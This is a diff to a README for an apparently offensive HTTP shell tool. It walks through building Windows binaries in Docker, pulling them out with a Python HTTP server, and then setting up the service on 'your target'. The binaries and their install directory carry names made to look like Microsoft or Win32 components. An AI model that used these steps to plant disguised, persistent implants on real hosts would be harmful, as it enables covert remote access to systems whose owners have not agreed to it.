@@ -28,7 +28,30 @@ flask run
 ```
 service nginx start
 ```
-9. Build docker container:
+9. Build docker container with dockerfile (dockerfile must be in current directory):
 ```
-docker build -t HTTPShellContainer
+docker build .
+```
+10. Enter the container (find it with "docker ps -a"; should be at the top of the list):
+```
+docker exec -ti [container_name] /bin/bash
+```
+11. Exfiltrate the compiled binaries located in project directorys "InstallService" and "ServiceBinary" target/x86_64-pc-windows-gnu/debug/. I'll use
+```
+python3 -m http.server 80
+```
+then wget from host. You can create another container with "docker run" and mount folders. The HTTP server with python is my preferred method. These binaries should be:
+```
+windows_service_wrapper.exe
+windows_Win32_Temp.dll
+windows_Win32_Temp.exe
+```
+
+Creating the service on your target:
+--------
+This is a generic method. Use your own loaders/stages to get the binaries on the host and run these commands.
+
+Create the directory (this can be changed in the source code):
+```
+mkdir C:\programdata\MicrosoftW
 ```
